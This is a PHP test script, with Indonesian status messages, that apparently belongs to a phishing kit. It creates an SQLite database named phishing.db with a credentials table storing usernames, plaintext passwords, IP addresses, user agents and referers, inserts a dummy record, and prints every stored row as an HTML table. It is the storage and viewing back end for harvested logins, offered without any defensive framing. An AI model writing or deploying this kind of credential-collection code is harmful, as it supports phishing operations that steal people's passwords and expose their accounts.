<?php
// Test database creation
$db_file = __DIR__ . '/phishing.db';

try {
    // Create database
    $db = new SQLite3($db_file);
    
    // Create table
    $sql = "CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        ip_address TEXT NOT NULL,
        user_agent TEXT NOT NULL,
        referer TEXT,
        timestamp TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )";
    
    if ($db->exec($sql)) {
        echo "✅ Database dan tabel berhasil dibuat<br>";
    } else {
        echo "❌ Error membuat tabel: " . $db->lastErrorMsg() . "<br>";
    }
    
    // Test insert
    $stmt = $db->prepare("INSERT INTO credentials (username, password, ip_address, user_agent, referer, timestamp) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bindValue(1, 'test_user', SQLITE3_TEXT);
    $stmt->bindValue(2, 'test_pass', SQLITE3_TEXT);
    $stmt->bindValue(3, '127.0.0.1', SQLITE3_TEXT);
    $stmt->bindValue(4, 'Test Agent', SQLITE3_TEXT);
    $stmt->bindValue(5, 'Direct', SQLITE3_TEXT);
    $stmt->bindValue(6, date('Y-m-d H:i:s'), SQLITE3_TEXT);
    
    if ($stmt->execute()) {
        echo "✅ Data test berhasil dimasukkan<br>";
    } else {
        echo "❌ Error memasukkan data: " . $db->lastErrorMsg() . "<br>";
    }
    
    // View data
    $results = $db->query('SELECT * FROM credentials');
    echo "<h3>Data di database:</h3>";
    echo "<table border='1'>";
    echo "<tr><th>ID</th><th>Username</th><th>Password</th><th>IP</th><th>Time</th></tr>";
    
    while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
        echo "<tr>";
        echo "<td>" . htmlspecialchars($row['id']) . "</td>";
        echo "<td>" . htmlspecialchars($row['username']) . "</td>";
        echo "<td>" . htmlspecialchars($row['password']) . "</td>";
        echo "<td>" . htmlspecialchars($row['ip_address']) . "</td>";
        echo "<td>" . htmlspecialchars($row['timestamp']) . "</td>";
        echo "</tr>";
    }
    echo "</table>";
    
    $db->close();
    
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage();
}

// Check if file exists
echo "<br><br>File database: " . (file_exists($db_file) ? "✅ Ada" : "❌ Tidak ada") . "<br>";
if (file_exists($db_file)) {
    echo "Ukuran file: " . filesize($db_file) . " bytes<br>";
}
?>
